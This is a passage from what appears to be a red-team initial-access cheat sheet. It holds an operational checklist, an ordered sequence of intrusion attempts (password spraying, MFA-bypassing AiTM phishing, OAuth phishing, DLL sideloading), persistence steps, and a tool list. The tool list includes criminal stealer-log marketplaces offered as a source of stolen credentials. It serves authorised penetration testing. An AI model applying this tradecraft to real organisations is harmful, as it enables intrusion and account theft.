  NetFlow: new connections to external IPs from edge devices
  Email gateway: attachment analysis, URL rewriting, sandbox detonation
```

---

## 12 — OPERATIONAL CHECKLIST

```
PRE-OPERATION:
□ OSINT complete: employees, emails, tech stack, external attack surface
□ Target mapping: external services, VPN vendor, email platform, cloud provider
□ SaaS footprint mapped: identify SaaS vendors with OAuth integrations to target
□ CI/CD exposure assessed: public repos, GitHub Actions, GitLab CI, Jenkins instances
□ Breach data checked: credentials from previous compromises of target or employees
□ Infostealer log check: search for target domain in stealer log marketplaces (cookies, tokens)
□ Attack infrastructure ready:
  □ Aged domains (6+ months) with valid categorization
  □ TLS certificates (Let's Encrypt or purchased)
  □ SMTP infrastructure with SPF/DKIM/DMARC configured and IP warmed
    (MANDATORY: Outlook rejects non-DMARC since May 2025, Gmail since Nov 2025)
  □ Redirector chain (cloud function → C2 server)
  □ C2 configured with malleable profile (mimic legitimate traffic)
□ Payloads tested against current EDR/AV in lab environment
□ Phishing pretexts drafted, reviewed, and tested (grammar, branding, timing)
□ Rules of engagement confirmed

ATTEMPT ORDER (advanced methodology — quietest first):
1. Check infostealer logs for target domain (session cookies, VPN creds, SSO tokens)
2. Check breach data for valid credentials → test against external services
3. Password spray against external services (O365, VPN) — slow, distributed
4. Exploit edge devices (VPN, firewall) if known vulnerable version identified
5. AiTM phishing campaign → session token theft (bypass MFA)
6. Device code OAuth phishing (cloud-focused targets — impersonate trusted contact)
7. OAuth consent phishing (persistent API access without password)
8. SaaS token theft via infostealer logs / SaaS-to-SaaS pivot (if applicable)
9. ClickFix delivery (compromised site or targeted lure → self-executed payload)
10. Spearphishing with DLL sideloading payload (if endpoint access needed)
11. Exploit public-facing web applications (Confluence, Exchange, etc.)
12. CI/CD pipeline compromise (if target has public repos / known CI infrastructure)
13. Supply chain / trusted relationship (long-term, high-effort)
14. Physical access / device implant (if in scope and other vectors fail)

POST-ACCESS (First 30 minutes):
□ Establish lightweight persistence IMMEDIATELY (SSH key, Run key, scheduled task)
□ Identify what user/context you are running as
□ Determine: domain-joined? cloud-only? hybrid?
□ Check for security tools: EDR, AV, monitoring agents
□ Verify egress: can you reach your C2? What ports are open outbound?
□ Do NOT run noisy enumeration tools yet — observe first
□ Upgrade persistence to more resilient mechanism (see Persistence cheat sheet)
□ Begin careful internal reconnaissance
□ Document initial access vector with evidence and timestamps
```

---

## 13 — TOOL QUICK REFERENCE

```
PHISHING / CREDENTIAL THEFT:
  Evilginx3 (open-source)       AiTM reverse proxy — session token theft (bypasses MFA)
  Evilginx Pro (commercial)     Advanced AiTM with anti-detection (breakdev.org)
  EvilnoVNC                     VNC-based AiTM — harder to detect than reverse proxy
  GoPhish                       Phishing campaign management framework
  Modlishka                     Transparent reverse proxy for credential theft
  TokenTacticsV2                Device code phishing for Azure/O365 (f-bader/TokenTacticsV2)
                                  NOTE: Original rvrsh3ll/TokenTactics is STALE
  TeamFiltration                O365 enumeration + spray + exfil suite (v3.5.5, semi-active)
                                  NOTE: --validate-teams may be broken (Microsoft API changes mid-2024)
  o365enum                      O365 user enumeration
  entraspray                    Entra ID password spraying (replaces MSOLSpray)
  MSOLSpray                     Azure AD password spraying — ABANDONED, no updates since ~2020
  Trevorspray                   Distributed password spraying (multi-IP) — feature-complete/stale
  Spray365                      Azure/O365 spray with timing controls — uses deprecated adal library

PAYLOAD GENERATION:
  msfvenom                   Metasploit payload generator
  Cobalt Strike (Artifact Kit)  Custom payload generation
  Sliver (implants)          Open-source C2 implant generation
  Havoc (demon)              C2 agent generation
  SharpDllProxy              DLL sideloading proxy generator (feature-complete/stale)
  Donut                      Shellcode generator from .NET assemblies (feature-complete/stale)
  ScareCrow                  ARCHIVED — repo is read-only, no longer maintained.
                               Ineffective against modern EDR. Seek alternatives.

EXPLOITATION:
  Metasploit                 Exploit framework (largest public exploit DB)
  Nuclei                     Template-based vulnerability scanner
  searchsploit               Local ExploitDB search
  Nmap (NSE scripts)         Service detection + vuln scanning

CLOUD:
  AADInternals (v0.9.8)     Azure AD / Entra ID attack toolkit — split into 2 modules since v0.9.6:
                               AADInternals (core) + AADInternals-Endpoints (device functions)
  ROADtools                  Azure AD enumeration and attack
  Pacu                       AWS exploitation framework
  ScoutSuite                 Multi-cloud security auditing
  CloudFox                   Cloud attack surface enumeration — REQUIRES v1.17.0+ (Dec 2025 breaking
                               change in AWS public service mapping format broke all earlier versions)

AiTM / PhaaS PLATFORMS (awareness — used by criminal actors and modeled in red team ops):
  Tycoon 2FA                 Most widespread PhaaS platform (per Sekoia 2025 analysis)
  EvilProxy                  $400/mo PhaaS — pre-built phishlets, session token capture
  Rockstar 2FA               Telegram-based PhaaS targeting Microsoft 365
  Sneaky 2FA                 AiTM kit with Cloudflare Turnstile anti-analysis
  Mamba 2FA                  Low-cost PhaaS with Telegram C2
  W3LL Panel                 Underground marketplace — compromised 56,000+ M365 accounts
  Greatness                  PhaaS targeting M365 with MFA bypass
  NakedPages                 Customizable phishing framework with AiTM capability

CI/CD & SUPPLY CHAIN:
  Gato (GitHub Attack Toolkit) GitHub Actions security analysis and exploitation
  Legitify                   GitHub/GitLab org-level security posture checks
  Chainsaw                   Log analysis for CI/CD compromise detection
  Trufflehog                 Secret scanning in git repos, CI logs, S3 buckets

SaaS ATTACK:
  GraphRunner                Microsoft 365 / Entra ID post-compromise tool (token-based access)
  Catapult                   Salesforce post-exploitation framework
  SlackPirate                Slack token-based data exfiltration

INFRASTRUCTURE:
  GoPhish                    Campaign management
  Postfix + opendkim         SMTP infrastructure
  Let's Encrypt (certbot)    TLS certificate automation
  Apache mod_rewrite         Redirector configuration
  Cobalt Strike / Sliver     C2 frameworks

PHYSICAL:
  Proxmark3                  RFID/NFC badge cloning
  Flipper Zero               Multi-protocol wireless tool
  Hak5 Rubber Ducky          HID keystroke injection
  Hak5 LAN Turtle            Covert network implant
  O.MG Cable                 USB cable with embedded implant

METHODOLOGY REFERENCES:
  MITRE ATT&CK TA0001        https://attack.mitre.org/tactics/TA0001/
  CISA KEV Catalog            https://www.cisa.gov/known-exploited-vulnerabilities-catalog
  HackTricks                  https://book.hacktricks.wiki/
  The Hacker Recipes          https://www.thehacker.recipes/
  PayloadsAllTheThings        https://github.com/swisskyrepo/PayloadsAllTheThings

INFOSTEALER LOG INTELLIGENCE:
  Hudson Rock Cavalier        Commercial stealer log intelligence platform
  Flare                       Stealer log monitoring + dark web credential exposure
  SpyCloud                    Enterprise credential exposure monitoring
  Russian Market / 2easy      Direct stealer log marketplaces (operational access)
  Telegram channels           Real-time stealer log distribution (search by domain)
```

---

*Mapped to: MITRE ATT&CK TA0001 (Initial Access) · T1078 (Valid Accounts) · T1078.004 (Cloud Accounts) · T1110.003 (Password Spraying) · T1110.004 (Credential Stuffing) · T1133 (External Remote Services) · T1189 (Drive-by Compromise) · T1190 (Exploit Public-Facing Application) · T1195.002 (Compromise Software Supply Chain) · T1199 (Trusted Relationship) · T1200 (Hardware Additions) · T1528 (Steal Application Access Token) · T1539 (Steal Web Session Cookie) · T1550.001 (Application Access Token) · T1566.001 (Spearphishing Attachment) · T1566.002 (Spearphishing Link) · T1566.003 (Spearphishing via Service) · T1566.004 (Spearphishing Voice) · T1574.002 (DLL Side-Loading) · T1091 (Replication Through Removable Media) · T1204.002 (User Execution: Malicious File) · T1027.006 (HTML Smuggling) · T1497 (Virtualization/Sandbox Evasion) · T1659 (Content Injection)*
